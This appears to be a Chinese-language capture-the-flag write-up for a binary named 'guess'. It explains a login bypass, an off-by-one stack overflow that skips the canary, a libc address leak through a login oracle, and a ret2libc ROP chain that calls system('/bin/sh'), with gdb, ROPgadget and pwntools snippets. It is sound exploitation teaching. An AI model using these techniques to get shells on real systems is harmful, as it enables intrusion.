# Guess

```shell
file guess
guess: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a086a8bf9bd5ad76e6c86b1e16e239da66b1632, stripped
```

感觉就 64 位的信息有点用

## Login

```c
printf("Account: ");
  read(0, buf, 0x100uLL);
  printf("Password: ");
  read(0, v3, 0x100uLL);
  for ( i = 0; i < strlen(buf); ++i )
  {
    if ( buf[i] != v3[i] )
    {
      puts("Login fail");
      return __readfsqword(0x28u) ^ v5;
    }
  }
```

上面代码告诉我们，只要 account 和 password 相同即可注册。



## Launch a Bash

### 关键代码

```c
unsigned __int64 sub_91A()
{
  char buf[64]; // [rsp+10h] [rbp-50h] BYREF
  int i; // [rsp+50h] [rbp-10h]
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Welcome, Boss. Leave your valuable comments: ");
  for ( i = 0; i != 65; ++i )
  {
    read(0, &buf[i], 1uLL);
    if ( buf[i] == 10 )
      break;
  }
  return __readfsqword(0x28u) ^ v3;
}
```



### Buffer Overflow

上面的代码中，buf 数组为 buf[0] 到 buf[63]，但是 read 循环的结束条件为 `i!=65`。

同时，buf 数组之后存的就是 i，那么当 `i==64` 时，本来应该赋值给 buf[64] 的数会赋值给 i，我们给 i 一个大于64 的数，加 1 后超过 65，循环就会继续，我们就可以对二进制文件的其他地方进行改写。

接下来我们由于没有同时可以写和执行的内存，我们只能通过 ROP 来 launch a bash。

这里有一篇不错的 ROP [教程](http://gauss.ececs.uc.edu/Courses/c6056/pdf/rop.pdf) 



### 使用 GDB 获得 buffer 与栈顶的相对位置差

思路：

* buffer：查看第一次 `read(read(0, &buf[i], 1uLL))` 时 `rsi` 寄存器的值
* 栈顶：查看 `return` 时 `rsp` 寄存器的值

先 `./guess`，再开 gdb

```shell
gdb attach $(pidof guess)

rt
# back trace 查看堆栈信息
# 以下面的结果为例：
#0  0x00007f5f622d8992 in __GI___libc_read (fd=0, buf=0x7fff3cf5df10, nbytes=15) at ../sysdeps/unix/sysv/linux/read.c:26
#1  0x000055f739000a1d in ?? ()
#2  0x000055f739000be2 in ?? ()
#3  0x00007f5f621edd90 in __libc_start_call_main (main=main@entry=0x55f739000b62, argc=argc@entry=1, argv=argv@entry=0x7fff3cf5e068) at ../sysdeps/nptl/libc_start_call_main.h:58
#4  0x00007f5f621ede40 in __libc_start_main_impl (main=0x55f739000b62, argc=1, argv=0x7fff3cf5e068, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fff3cf5e058) at ../csu/libc-start.c:392
#5  0x000055f73900083a in ?? ()
# 7f 开头的是调用 libc 里的函数，55 开头的是调用 guess 里的函数

tbreak *0x000055f739000976
# IDA 中 call read 指令的地址是 0x0000000000000976,执行时只有最后几位是不变的，前面是随机的

b *0x000055f7390009bf

c

x $rsi
# x 表示以十六进制输出
# 结果：0x7fff3cf5dca0: 0x00000000

c

x $rsp
# 结果：0x7fff3cf5dcf8: 0x39000b44
```

我们可以得知，buffer 到 return address 的距离是 0x7fff3cf5dcf8 - 0x7fff3cf5dca0 = 0x58

### 函数返回时的栈帧变化

* rsp（低地址，指向栈顶的指针）移到 rbp（高地址，指向栈底的指针）
* rbp 指向的地址存了调用函数原来的 rbp 地址，把 rbp 移动到调用函数的 rbp 地址处，同时将 rsp 上移 1
* 执行 ret 指令，即把 pc 赋值成 rsp 指向的值，并把 rsp 上移 1

### ROP的含义

举个例子，假设要执行 `execve(A)`：

从返回地址，即 rbp 上面 1 的位置，同时也是执行 ret 时 rsp 指针的地址，开始依次写入：

* 指令 `pop rdi;ret` 的地址
* A 的地址
* `execve()` 指令的地址

模拟执行过程如下：

* 恢复栈帧，rsp 上移至 rbp；上移 rbp 至调用函数的 rbp 处，并将 rsp 上移 1
* 执行 ret 指令，把 pc 赋值成指令 `pop rdi;ret` 的地址，并将 rsp 上移 1，指向 A 的地址
* 执行 `pop rdi` 指令，把 A 的地址赋值给 rdi，并将 rsp 上移 1，指向 `execve()` 指令的地址
* 执行 `ret` 指令，把 pc 赋值成 `execve()` 指令的地址
* 最后执行 `execve()` 指令

### 通过 gdb 以及 login fail 得到运行时地址

```shell
# gdb
0x7ffca50abf50: 0x0000000000000a62(输入的password'b')       0x3d071f4750cdf300
0x7ffca50abf60: 0x00007fc78f1346a0(某个libc的地址)    		0x00007ffca50ac070

(gdb) p system
$1 = {int (const char *)} 0x7fc78ef6ad60 <__libc_system>
```

于是我们知道了 system 函数和某个 libc 中不知名地址之间的相对距离

运行时，由于 Login 的比较以 strlen(buf) 结束，所以如果 account 长而 password 短，则在比较完 password 之后会比较 account 的后半段和内存中 password 之后的内容，也就是上面的某个 libc 地址。我们可以通过不断的尝试 account 后半段的内容，通过返回值--是否login 成功来获取那个 libc 地址

```python
# implement in python with pwn
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc_addr 为运行时的那个不知名 libc 地址
system_addr = libc_addr - 0x7fc78f1346a0 + 0x7fc78ef6ad60
shellcode_addr = system_addr - libc.symbols["system"] + next(libc.search(b'/bin/sh'))
# gadget: pop rdi; ret
gadget_addr = system_addr - libc.symbols["system"] + 0x2a3e5
```

### 使用  ROPgadget 寻找合适的 gadget

```shell
ldd guess   
linux-vdso.so.1 (0x00007ffd4949a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0a407d8000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0a40dab000)
```

注意 guess 运行的时候用的是本地的 libc 而不是他给的 libc，到时候求相对位置要分析的是 /lib/x86_64-linux-gnu/libc.so.6

```shell
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'pop|ret' | grep rdi  
0x000000000002a745 : pop rdi ; pop rbp ; ret
0x000000000002a3e5 : pop rdi ; ret
0x00000000001bc10d : pop rdi ; ret 0xffe6
```

我们用 0x2a3e5 的 gadget

```python
gadget1_addr = system_addr - libc.symbols["system"] + 0x2a3e5
```

### Overflow 改写 return address

我们的 overflow 分为以下几步：

* 先输入任意的 64 个字符填满 buf[64]

* 然后输入的字符会修改 i 的值，这里我们需要直接让下一次 buf[i] 指向 return address

  调试过程中发现，如果修改 i 到 return address 之间的内存会出发 Segmentation Fault，gdb 调试发现 call 了 __stack_chk_fail，即触发了 canary 保护，因此我们必须跳过中间的内存

  之前计算了 buf 到 return address 差了 0x58，而写入 i 后会 ++i，因此写入`bytes([0x58 - 1])`

* 之后按照 ROP 的分析，依次写入 gadget1_addr，shellcode_addr 和 system_addr

* 最后要停止写入，查看 guess 代码发现 `if ( buf[i] == 10 ) break;`，于是写入 b'0x0a'

但是这样进入 system 函数后会发现在 movaps 指令处Segmentation Fault，查询后发现 movaps 需要 16 字节对齐，由于 padding 是 88，于是需要把 system_addr 往后移 8 位，这样子执行 system 函数的时候 rsp 指针就 16 字节对齐了，但是加入的东西不能影响之前的功能，于是选择加入一个 ret 指令作为 gadget2，这样子 gadget1 执行 ret 指令时，return address 处是 gadget2 的 ret 指令，执行这个 ret 指令后 rsp 继续上移至存储 system 函数地址的内存。

```shell
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only 'ret'         
Gadgets information
============================================================
0x0000000000029cd6 : ret
```

```python
# gadget2: ret
gadget2_addr = system_addr - libc.symbols["system"] + 0x29cd6
```

